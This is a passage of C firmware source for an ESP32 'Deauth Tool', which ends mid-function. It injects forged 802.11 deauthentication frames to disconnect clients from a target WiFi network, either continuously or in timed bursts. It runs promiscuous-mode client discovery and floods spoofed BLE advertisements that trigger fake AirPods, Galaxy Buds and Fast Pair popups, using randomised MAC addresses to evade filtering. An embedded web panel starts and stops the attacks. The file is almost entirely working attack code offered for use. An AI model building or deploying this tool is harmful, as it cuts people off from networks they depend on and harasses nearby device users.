static bool is_whitelisted(const uint8_t *mac) {
    for (int i = 0; i < s_whitelist_count; i++) {
        if (memcmp(s_whitelist[i], mac, 6) == 0) return true;
    }
    return false;
}

/* =====================================================
 *  WiFi Event Handler
 * ===================================================== */

static void event_handler(void *arg, esp_event_base_t event_base,
                          int32_t event_id, void *event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        esp_wifi_connect();
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        if (s_retry_num < MAX_RETRY) {
            esp_wifi_connect();
            s_retry_num++;
            ESP_LOGI(TAG, "Retry connect (%d/%d)", s_retry_num, MAX_RETRY);
        } else {
            xEventGroupSetBits(s_wifi_event_group, WIFI_FAIL_BIT);
        }
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
        ESP_LOGI(TAG, "Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
        s_retry_num = 0;
        xEventGroupSetBits(s_wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

/* =====================================================
 *  WiFi STA Init
 * ===================================================== */

static void wifi_init_sta(void)
{
    s_wifi_event_group = xEventGroupCreate();

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    esp_event_handler_instance_t inst_any_id, inst_got_ip;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                    &event_handler, NULL, &inst_any_id));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                    &event_handler, NULL, &inst_got_ip));

    wifi_config_t wifi_config = {
        .sta = {
            .ssid = WIFI_SSID,
            .password = WIFI_PASS,
            .threshold.authmode = WIFI_AUTH_WPA2_PSK,
        },
    };
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "Connecting to %s...", WIFI_SSID);

    EventBits_t bits = xEventGroupWaitBits(s_wifi_event_group,
            WIFI_CONNECTED_BIT | WIFI_FAIL_BIT,
            pdFALSE, pdFALSE, portMAX_DELAY);

    if (bits & WIFI_CONNECTED_BIT) {
        ESP_LOGI(TAG, "Connected to %s", WIFI_SSID);
        wifi_ap_record_t ap_info;
        if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
            memcpy(s_target_bssid, ap_info.bssid, 6);
            s_target_channel = ap_info.primary;
            ESP_LOGI(TAG, "Target: %02X:%02X:%02X:%02X:%02X:%02X ch:%d",
                     s_target_bssid[0], s_target_bssid[1], s_target_bssid[2],
                     s_target_bssid[3], s_target_bssid[4], s_target_bssid[5],
                     s_target_channel);
        }
    } else if (bits & WIFI_FAIL_BIT) {
        ESP_LOGE(TAG, "Failed to connect. Starting AP...");
        esp_wifi_stop();
        wifi_init_ap();
    }
}

static void wifi_init_ap(void)
{
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    wifi_config_t ap_config = {
        .ap = {
            .ssid = AP_SSID,
            .ssid_len = strlen(AP_SSID),
            .channel = 1,
            .password = AP_PASS,
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA2_PSK,
        },
    };

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_LOGI(TAG, "AP: %s, IP: 192.168.4.1", AP_SSID);
}

/* =====================================================
 *  Promiscuous Scan (for client discovery)
 * ===================================================== */

static void IRAM_ATTR promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (len < 24) return;

    uint8_t frame_type    = (frame[0] >> 2) & 0x03;
    uint8_t frame_subtype = (frame[0] >> 4) & 0x0F;

    /* Beacon */
    if (frame_type == 0 && frame_subtype == 8) {
        if (len < 36) return;
        uint8_t *bssid = (uint8_t *)(frame + 10);

        /* Find SSID IE */
        int pos = 24;
        while (pos + 1 < len) {
            uint8_t ie_id = frame[pos];
            uint8_t ie_len = frame[pos + 1];
            if (ie_id == 0 && ie_len > 0 && ie_len < 33 && pos + 2 + ie_len <= len) {
                char ssid[34] = {0};
                memcpy(ssid, frame + pos + 2, ie_len);

                bool found = false;
                for (int i = 0; i < s_network_count; i++) {
                    if (memcmp(s_networks[i].bssid, bssid, 6) == 0) {
                        found = true;
                        break;
                    }
                }
                if (!found && s_network_count < MAX_NETWORKS) {
                    memcpy(s_networks[s_network_count].bssid, bssid, 6);
                    s_networks[s_network_count].rssi    = pkt->rx_ctrl.rssi;
                    s_networks[s_network_count].channel = pkt->rx_ctrl.channel;
                    strncpy(s_networks[s_network_count].ssid, ssid, 32);
                    s_network_count++;
                }
                break;
            }
            pos += 2 + ie_len;
        }
    }

    /* Probe Request or Data from/to AP — learn clients */
    if (type == WIFI_PKT_MGMT && frame_subtype == 4) {
        /* Probe Request */
        uint8_t *src = (uint8_t *)(frame + 10);
        bool found = false;
        for (int i = 0; i < s_client_count; i++) {
            if (memcmp(s_clients[i].mac, src, 6) == 0) {
                s_clients[i].rssi = pkt->rx_ctrl.rssi;
                found = true;
                break;
            }
        }
        if (!found && s_client_count < MAX_CLIENTS) {
            memcpy(s_clients[s_client_count].mac, src, 6);
            s_clients[s_client_count].rssi    = pkt->rx_ctrl.rssi;
            s_clients[s_client_count].channel = pkt->rx_ctrl.channel;
            s_client_count++;
        }
    }

    /* Also catch data frames to learn associated clients */
    if (type == WIFI_PKT_DATA && len >= 24) {
        /* 802.11 data frame: addr1=receiver, addr2=sender, addr3=BSSID (To AP) or BSSID (From AP) */
        uint8_t *addr1 = (uint8_t *)(frame + 4);
        uint8_t *addr2 = (uint8_t *)(frame + 10);
        uint8_t *addr3 = (uint8_t *)(frame + 16);

        /* Filter: only care about frames involving the target AP's BSSID */
        bool to_ap   = (s_client_count == 0 || memcmp(addr3, s_clients[0].mac, 6) == 0);
        bool from_ap = false;

        /* addr3 might be the target BSSID */
        for (int i = 0; i < s_network_count; i++) {
            if (memcmp(addr3, s_networks[i].bssid, 6) == 0) {
                from_ap = true;
                break;
            }
        }

        /* If this frame is TO the AP (addr3 == BSSID), then addr2 is the client */
        /* If this frame is FROM the AP (addr2 == BSSID), then addr1 is the client */
        uint8_t *client_mac = NULL;
        if (from_ap) {
            /* From AP — addr1 is client (skip broadcast) */
            if (!(addr1[0] & 0x01)) client_mac = addr1;
        } else {
            /* Try to detect if addr3 matches a known AP BSSID */
            bool addr3_is_ap = false;
            for (int i = 0; i < s_network_count; i++) {
                if (memcmp(addr3, s_networks[i].bssid, 6) == 0) {
                    addr3_is_ap = true;
                    break;
                }
            }
            if (addr3_is_ap) {
                /* To AP — addr2 is client */
                if (!(addr2[0] & 0x01)) client_mac = addr2;
            }
        }

        if (client_mac) {
            bool found = false;
            for (int i = 0; i < s_client_count; i++) {
                if (memcmp(s_clients[i].mac, client_mac, 6) == 0) {
                    s_clients[i].rssi = pkt->rx_ctrl.rssi;
                    found = true;
                    break;
                }
            }
            if (!found && s_client_count < MAX_CLIENTS) {
                memcpy(s_clients[s_client_count].mac, client_mac, 6);
                s_clients[s_client_count].rssi    = pkt->rx_ctrl.rssi;
                s_clients[s_client_count].channel = pkt->rx_ctrl.channel;
                s_client_count++;
            }
        }
    }
}


/* =====================================================
 *  Deauth
 * ===================================================== */

static int send_deauth(const uint8_t *ap, const uint8_t *client,
                       uint16_t reason, uint8_t channel)
{
    deauth_frame_t pkt;
    memset(&pkt, 0, sizeof(pkt));

    /* 802.11 Deauth: type=0 (mgmt), subtype=12
     * Frame Control byte 0: [Protocol(2) Type(2) Subtype(4)]
     *   = 0b00 00 1100 = 0xC0
     * Frame Control byte 1: all zeros (no flags)
     * On little-endian ESP32, store as 0x00C0 → memory [C0, 00] */
    pkt.frame_control = 0x00C0;
    pkt.duration = 0;
    memcpy(pkt.addr1, client, 6);
    memcpy(pkt.addr2, ap, 6);
    memcpy(pkt.addr3, ap, 6);
    pkt.seq_ctrl = 0;
    pkt.reason_code = reason;

    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(pkt), false);
    if (ret == ESP_OK) {
        s_deauth_count++;
        return 1;
    }
    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
    return 0;
}

static void deauth_task(void *arg)
{
    uint16_t reason = s_deauth_reason;
    uint8_t  burst  = s_deauth_burst;
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    ESP_LOGI(TAG, "Deauth started: reason=%u burst=%u ch=%d target=%02X:%02X:%02X:%02X:%02X:%02X",
             reason, burst, s_target_channel,
             s_target_bssid[0], s_target_bssid[1], s_target_bssid[2],
             s_target_bssid[3], s_target_bssid[4], s_target_bssid[5]);

    /* Enable promiscuous mode — required for management frame injection */
    esp_wifi_set_promiscuous(true);

    while (s_deauth_running) {
        if (s_deauth_broadcast) {
            if (s_whitelist_count == 0) {
                /* No whitelist — broadcast kicks everyone */
                for (int i = 0; i < burst && s_deauth_running; i++) {
                    send_deauth(s_target_bssid, broadcast, reason, s_target_channel);
                    vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
                }
            }
            /* Per-client deauth (skip whitelisted) */
            for (int c = 0; c < s_client_count && s_deauth_running; c++) {
                if (is_whitelisted(s_clients[c].mac)) continue;
                for (int i = 0; i < burst && s_deauth_running; i++) {
                    send_deauth(s_target_bssid, s_clients[c].mac, reason, s_target_channel);
                    vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
                }
            }
        } else {
            for (int c = 0; c < s_client_count && s_deauth_running; c++) {
                for (int i = 0; i < burst && s_deauth_running; i++) {
                    send_deauth(s_target_bssid, s_clients[c].mac, reason, s_target_channel);
                    vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
                }
            }
        }
        /* Pause between cycles — device can't reconnect during this time */
        if (s_deauth_interval_ms > 0) {
            vTaskDelay(pdMS_TO_TICKS(s_deauth_interval_ms));
        }
    }

    /* Disable promiscuous mode */
    esp_wifi_set_promiscuous(false);

    ESP_LOGI(TAG, "Deauth stopped. Total: %"PRIu32, s_deauth_count);
    vTaskDelete(NULL);
}

/* =====================================================
 *  BLE Spam — Advertising Flood
 * ===================================================== */

static bool s_ble_spam_running = false;
static uint32_t s_ble_spam_count = 0;
static TaskHandle_t s_ble_spam_task_handle = NULL;

/* Apple AirPods spam payload — triggers proximity popup */
static const uint8_t apple_airpods[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

/* Apple AppleTV Setup — unused but kept for reference */
__attribute__((unused))
static const uint8_t apple_tv[] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
    0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
};

/* Samsung Galaxy — triggers Galaxy Buds popup */
static const uint8_t samsung_galaxy[] = {
    0x17, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
    0x01, 0x01, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

/* Google Fast Pair — triggers pairing popup */
static const uint8_t google_fastpair[] = {
    0x15, 0xff, 0x4c, 0x00, 0x01, 0x00, 0x01, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

typedef enum {
    BLE_SPAM_APPLE,
    BLE_SPAM_SAMSUNG,
    BLE_SPAM_GOOGLE,
    BLE_SPAM_ALL
} ble_spam_type_t;

static volatile ble_spam_type_t s_ble_spam_type = BLE_SPAM_APPLE;

/* Forward declarations */
static void stop_ble_spam(void);

/* Advertising params — global so callback can access */
static esp_ble_adv_params_t s_adv_params = {0};

/* GAP callback — required for BLE advertising to work */
static void esp_gap_ble_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
{
    switch (event) {
        case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
            esp_ble_gap_start_advertising(&s_adv_params);
            break;
        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
            if (param->adv_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
                ESP_LOGE(TAG, "BLE adv start failed");
            }
            break;
        default:
            break;
    }
}

/* Apple TV payload — kept for potential future use */

static void ble_spam_task(void *arg)
{
    ESP_LOGI(TAG, "BLE Spam started, type=%d", s_ble_spam_type);

    /* Configure advertising parameters */
    s_adv_params.adv_int_min       = 0x30;  /* 30ms */
    s_adv_params.adv_int_max       = 0x40;  /* 40ms */
    s_adv_params.adv_type          = ADV_TYPE_NONCONN_IND;
    s_adv_params.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
    s_adv_params.channel_map       = ADV_CHNL_ALL;
    s_adv_params.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

    /* Register GAP callback */
    esp_ble_gap_register_callback(esp_gap_ble_cb);

    while (s_ble_spam_running) {
        uint8_t payload[31];
        size_t payload_len = 0;

        switch (s_ble_spam_type) {
            case BLE_SPAM_APPLE:
                memcpy(payload, apple_airpods, sizeof(apple_airpods));
                payload_len = sizeof(apple_airpods);
                /* Randomize MAC to avoid filtering */
                {
                    uint8_t rand_addr[6];
                    rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
                    for (int i = 1; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
                    esp_ble_gap_set_rand_addr(rand_addr);
                }
                break;

            case BLE_SPAM_SAMSUNG:
                memcpy(payload, samsung_galaxy, sizeof(samsung_galaxy));
                payload_len = sizeof(samsung_galaxy);
                {
                    uint8_t rand_addr[6];
                    rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
                    for (int i = 1; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
                    esp_ble_gap_set_rand_addr(rand_addr);
                }
                break;

            case BLE_SPAM_GOOGLE:
                memcpy(payload, google_fastpair, sizeof(google_fastpair));
                payload_len = sizeof(google_fastpair);
                {
                    uint8_t rand_addr[6];
                    rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
                    for (int i = 1; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
                    esp_ble_gap_set_rand_addr(rand_addr);
                }
                break;

            case BLE_SPAM_ALL:
                {
                    static int spam_idx = 0;
                    const uint8_t *payloads[] = {
                        apple_airpods, samsung_galaxy, google_fastpair
                    };
                    const size_t sizes[] = {
                        sizeof(apple_airpods), sizeof(samsung_galaxy), sizeof(google_fastpair)
                    };
                    memcpy(payload, payloads[spam_idx], sizes[spam_idx]);
                    payload_len = sizes[spam_idx];
                    spam_idx = (spam_idx + 1) % 3;

                    uint8_t rand_addr[6];
                    rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
                    for (int i = 1; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
                    esp_ble_gap_set_rand_addr(rand_addr);
                }
                break;
        }

        /* Set raw advertising data — callback will start advertising */
        esp_ble_gap_config_adv_data_raw(payload, payload_len);
        s_ble_spam_count++;

        /* Wait for advertising to send, then stop and re-advertise */
        vTaskDelay(pdMS_TO_TICKS(100));
        esp_ble_gap_stop_advertising();
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    esp_ble_gap_stop_advertising();
    ESP_LOGI(TAG, "BLE Spam stopped. Total: %"PRIu32, s_ble_spam_count);
    vTaskDelete(NULL);
}

static void start_ble_spam(ble_spam_type_t type)
{
    if (s_ble_spam_running) {
        stop_ble_spam();
    }

    s_ble_spam_type = type;
    s_ble_spam_running = true;
    s_ble_spam_count = 0;

    xTaskCreate(ble_spam_task, "ble_spam", 4096, NULL, 5, &s_ble_spam_task_handle);
}

static void stop_ble_spam(void)
{
    if (s_ble_spam_running) {
        s_ble_spam_running = false;
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    s_ble_spam_task_handle = NULL;
}

static void init_ble(void)
{
    ESP_LOGI(TAG, "Initializing BLE...");

    /* Release classic BT memory — we only need BLE */
    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));

    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_err_t ret = esp_bt_controller_init(&bt_cfg);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "BT controller init failed: %s", esp_err_to_name(ret));
        return;
    }

    ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "BT controller enable failed: %s", esp_err_to_name(ret));
        return;
    }

    ret = esp_bluedroid_init();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Bluedroid init failed: %s", esp_err_to_name(ret));
        return;
    }

    ret = esp_bluedroid_enable();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Bluedroid enable failed: %s", esp_err_to_name(ret));
        return;
    }

    ESP_LOGI(TAG, "BLE initialized successfully");
}

/* =====================================================
 *  Web Server — HTML
 * ===================================================== */

static const char index_html[] =
"<!DOCTYPE html><html><head><meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>ESP32 Deauth</title>"
"<style>"
"*{margin:0;padding:0;box-sizing:border-box}"
"body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:15px}"
"h1{text-align:center;margin-bottom:15px;text-shadow:0 0 8px #0f0}"
".c{max-width:700px;margin:0 auto}"
".card{background:#111;border:1px solid #0f0;border-radius:6px;padding:15px;margin-bottom:15px}"
".card h2{border-bottom:1px solid #0f0;padding-bottom:8px;margin-bottom:10px;font-size:14px}"
"button{background:#0f0;color:#000;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-weight:bold;margin:4px;font-family:monospace}"
"button:hover{background:#0c0}"
"button.d{background:#f44}"
"button.d:hover{background:#c00}"
"button.sm{padding:3px 8px;font-size:11px;margin:1px}"
"button.sm.add{background:#0f0}"
"button.sm.rm{background:#f44}"
"select,input{background:#000;color:#0f0;border:1px solid #0f0;padding:6px 10px;border-radius:4px;margin:4px;font-family:monospace}"
"table{width:100%;border-collapse:collapse;margin-top:8px;font-size:12px}"
"th,td{padding:6px;text-align:left;border-bottom:1px solid #333}"
"th{background:#1a1a1a}"
"tr:hover{background:#1a1a1a}"
"#log{background:#000;padding:8px;border-radius:4px;height:150px;overflow-y:auto;font-size:11px}"
".st{padding:8px;margin:8px 0;border-radius:4px;background:#1a1a1a;border-left:3px solid #0f0}"
".st.on{border-left-color:#f44;background:#200}"
"@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}"
".pulse{animation:pulse 1s infinite}"
"</style></head><body><div class='c'>"
"<h1>ESP32 Deauth Tool</h1>"
"<div class='card'><h2 id='sht'>STATUS</h2><div class='st' id='st'>Loading...</div>"
"<button onclick='refresh()'>Refresh</button>"
"<button id='scanbtn' onclick='scan()'>Scan</button></div>"
"<div class='card'><h2>NETWORKS</h2><div id='nets'>Click Scan</div></div>"
"<div class='card'><h2>CLIENTS</h2><div id='cls'>Click Scan</div></div>"
"<div class='card'><h2>WHITELIST</h2><div id='wl'>Empty</div>"
"<div><input type='text' id='wlmac' placeholder='AA:BB:CC:DD:EE:FF' style='width:160px'>"
"<button onclick='wladd()'>Add</button></div></div>"
"<div class='card'><h2>BLE SPAM</h2>"
"<div><select id='ble_type'>"
"<option value='apple'>Apple AirPods/AppleTV</option>"
"<option value='samsung'>Samsung Galaxy Buds</option>"
"<option value='google'>Google Fast Pair</option>"
"<option value='all'>All (rotate)</option></select></div>"
"<div>Packets sent: <span id='ble_count'>0</span></div>"
"<br><button class='d' onclick='ble_start()'>START BLE SPAM</button>"
"<button onclick='ble_stop()'>STOP</button></div>"
"<div class='card'><h2>DEAUTH ATTACK</h2>"
"<div><select id='tgt'><option value='all'>All (broadcast)</option>"
"<option value='client'>Specific client</option></select>"
"<select id='csl' style='display:none'><option value=''>Select client</option></select></div>"
"<div><select id='rsn'><option value='1'>1-Unspecified</option>"
"<option value='3'>3-Deauth leaving</option>"
"<option value='4' selected>4-Inactivity</option>"
"<option value='7'>7-Class3 frame</option></select></div>"
"<div><input type='number' id='brst' value='10' min='1' max='100' style='width:60px'> packets/burst"
"<br><input type='number' id='intrv' value='0' min='0' max='10000' style='width:60px'> ms interval (0=continuous)</div>"
"<br><button class='d' onclick='start()'>START</button>"
"<button onclick='stop()'>STOP</button></div>"
"<div class='card'><h2>LOG</h2><div id='log'></div></div>"
"</div><script>"
"var _on=false;"
"function L(m){var l=document.getElementById('log');"
"l.innerHTML+='<div>['+new Date().toLocaleTimeString()+'] '+m+'</div>';"
"l.scrollTop=l.scrollHeight}"
"function upSt(d){"
"var st=document.getElementById('st');"
"var sh=document.getElementById('sht');"
"_on=(d.mode==='DEAUTH' || d.mode==='BLE_SPAM');"
"var c='WiFi: '+(d.wifi?'OK '+d.ssid:'AP mode')+'<br>IP: '+d.ip+'<br>Target: '+d.target_ssid+' ('+d.target_bssid+') ch:'+d.target_channel+'<br>Mode: <b>'+d.mode+'</b><br>Packets: '+d.deauth_count+'<br>Clients: '+d.client_count;"
"if(d.ble_spam){c+='<br>BLE Spam: <b>RUNNING</b> ('+d.ble_spam_count+' packets)';}"
"st.innerHTML=c;"
"st.className=_on?'st on pulse':'st';"
"sh.innerHTML=_on?'<span style=color:#f44>&#9679;</span> ATTACK RUNNING':'STATUS';"
"document.getElementById('ble_count').textContent=d.ble_spam_count||0;}"
"function refresh(){fetch('/api/status').then(function(r){return r.json()}).then(function(d){upSt(d)}).catch(function(e){L('Error: '+e)})}"
"function scan(){var b=document.getElementById('scanbtn');b.disabled=true;b.textContent='Scanning...';b.style.background='#f44';"
"L('Scanning...');fetch('/api/scan').then(function(r){return r.json()}).then(function(d){"
"var h='<table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th></tr>';"
"d.networks.forEach(function(n){h+='<tr><td>'+n.ssid+'</td><td>'+n.bssid+'</td><td>'+n.channel+'</td><td>'+n.rssi+'</td></tr>'});h+='</table>';"
"document.getElementById('nets').innerHTML=h;"
"h='<table><tr><th>MAC</th><th>Vendor</th><th>RSSI</th><th>Ch</th><th>WL</th></tr>';"
"d.clients.forEach(function(c){"
"h+='<tr><td>'+c.mac+'</td><td>'+c.vendor+'</td><td>'+c.rssi+'</td><td>'+c.channel+'</td><td>';"
"h+=c.whitelisted"
"?'<button class=\"sm rm\" onclick=\"wlrm(\\''+c.mac+'\\')\">- WL</button>'"
":'<button class=\"sm add\" onclick=\"wladdm(\\''+c.mac+'\\')\">+ WL</button>';"
"h+='</td></tr>'});h+='</table>';"
"document.getElementById('cls').innerHTML=h;"
"var s=document.getElementById('csl');s.innerHTML='<option value=\"\">Select</option>';"
"d.clients.forEach(function(c){s.innerHTML+='<option value=\"'+c.mac+'\">'+c.mac+' ('+c.vendor+')</option>'});"
"L('Found: '+d.networks.length+' networks, '+d.clients.length+' clients');"
"b.disabled=false;b.textContent='Scan';b.style.background='';})}"
"function wladd(){var m=document.getElementById('wlmac').value;if(!m){return}"
"fetch('/api/whitelist/add?mac='+m).then(function(r){return r.json()}).then(function(d){L('Whitelist: '+d.count);wlrefresh()})}"
"function wladdm(m){"
"fetch('/api/whitelist/add?mac='+m).then(function(r){return r.json()}).then(function(d){L('Added '+m);wlrefresh()})}"
"function wlrm(m){fetch('/api/whitelist/remove?mac='+m).then(function(r){return r.json()}).then(function(d){L('Removed '+m);wlrefresh()})}"
"function wlrefresh(){fetch('/api/whitelist').then(function(r){return r.json()}).then(function(d){"
"var h='';if(d.count==0){h='Empty'}else{"
"d.whitelist.forEach(function(m){h+='<div>'+m+' <button class=\"sm rm\" onclick=\"wlrm(\\''+m+'\\')\">remove</button></div>'});}"
"document.getElementById('wl').innerHTML=h;})}"
"document.getElementById('tgt').onchange=function(){"
"document.getElementById('csl').style.display="
"this.value=='client'?'inline-block':'none'};"
"function start(){var t=document.getElementById('tgt').value;"
"var r=document.getElementById('rsn').value;"
"var b=document.getElementById('brst').value;"
"var iv=document.getElementById('intrv').value;"
"var u='/api/deauth?reason='+r+'&burst='+b+'&interval='+iv;"
"if(t=='client'){var c=document.getElementById('csl').value;"
"if(!c){L('Select client!');return}u+='&client='+c}"
"L('Attack: '+(t=='client'?c:'broadcast'));"
"fetch(u).then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})"
"}"
"function stop(){fetch('/api/stop').then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})"
"}"
"function ble_start(){var t=document.getElementById('ble_type').value;"
"L('BLE Spam: '+t);"
"fetch('/api/ble/spam/start?type='+t).then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})"
"}"
"function ble_stop(){fetch('/api/ble/spam/stop').then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})"
"}"
"refresh();setInterval(refresh,2000);wlrefresh();"
"</script></body></html>";

/* =====================================================
 *  Web Server — API
 * ===================================================== */

static esp_err_t handle_index(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, index_html, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t handle_status(httpd_req_t *req)
{
    char target_bssid[18];
    snprintf(target_bssid, sizeof(target_bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
             s_target_bssid[0], s_target_bssid[1], s_target_bssid[2],
             s_target_bssid[3], s_target_bssid[4], s_target_bssid[5]);

    char ip_str[16] = "192.168.4.1";
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (netif) {
        esp_netif_ip_info_t ip_info;
        if (esp_netif_get_ip_info(netif, &ip_info) == ESP_OK) {
            snprintf(ip_str, sizeof(ip_str), IPSTR, IP2STR(&ip_info.ip));
        }
    }

    cJSON *json = cJSON_CreateObject();
    cJSON_AddBoolToObject(json, "wifi", strlen(ip_str) > 0 && strcmp(ip_str, "192.168.4.1") != 0);
    cJSON_AddStringToObject(json, "ssid", s_target_ssid);
    cJSON_AddStringToObject(json, "target_bssid", target_bssid);
    cJSON_AddNumberToObject(json, "target_channel", s_target_channel);
    cJSON_AddStringToObject(json, "ip", ip_str);
    cJSON_AddStringToObject(json, "mode", s_deauth_running ? "DEAUTH" : (s_ble_spam_running ? "BLE_SPAM" : "IDLE"));
    cJSON_AddNumberToObject(json, "deauth_count", s_deauth_count);
    cJSON_AddNumberToObject(json, "client_count", s_client_count);
    cJSON_AddNumberToObject(json, "network_count", s_network_count);
    cJSON_AddBoolToObject(json, "ble_spam", s_ble_spam_running);
    cJSON_AddNumberToObject(json, "ble_spam_count", s_ble_spam_count);

    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

static esp_err_t handle_scan(httpd_req_t *req)
{
    if (xSemaphoreTake(s_scan_mutex, 0) != pdTRUE) {
        cJSON *json = cJSON_CreateObject();
        cJSON_AddStringToObject(json, "status", "scan in progress");
        char *str = cJSON_PrintUnformatted(json);
        httpd_resp_set_type(req, "application/json");
        httpd_resp_send(req, str, strlen(str));
        cJSON_free(str);
        cJSON_Delete(json);
        return ESP_OK;
    }

    s_network_count = 0;
    s_client_count  = 0;

    /* ESP-IDF WiFi scan — find networks */
    wifi_scan_config_t scan_cfg = { .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = false };
    ESP_LOGI(TAG, "Starting WiFi scan...");
    esp_err_t err = esp_wifi_scan_start(&scan_cfg, true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_scan_start failed: %s", esp_err_to_name(err));
        xSemaphoreGive(s_scan_mutex);
        cJSON *json = cJSON_CreateObject();
        cJSON_AddStringToObject(json, "status", "scan failed");
        char *str = cJSON_PrintUnformatted(json);
        httpd_resp_set_type(req, "application/json");
        httpd_resp_send(req, str, strlen(str));
        cJSON_free(str);
        cJSON_Delete(json);
        return ESP_OK;
    }

    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);
    if (ap_count > MAX_NETWORKS) ap_count = MAX_NETWORKS;

    wifi_ap_record_t *ap_records = calloc(ap_count, sizeof(wifi_ap_record_t));
    if (ap_records) {
        esp_wifi_scan_get_ap_records(&ap_count, ap_records);
        for (int i = 0; i < ap_count; i++) {
            memcpy(s_networks[s_network_count].bssid, ap_records[i].bssid, 6);
            s_networks[s_network_count].rssi    = ap_records[i].rssi;
            s_networks[s_network_count].channel = ap_records[i].primary;
            strncpy(s_networks[s_network_count].ssid, (char *)ap_records[i].ssid, 32);
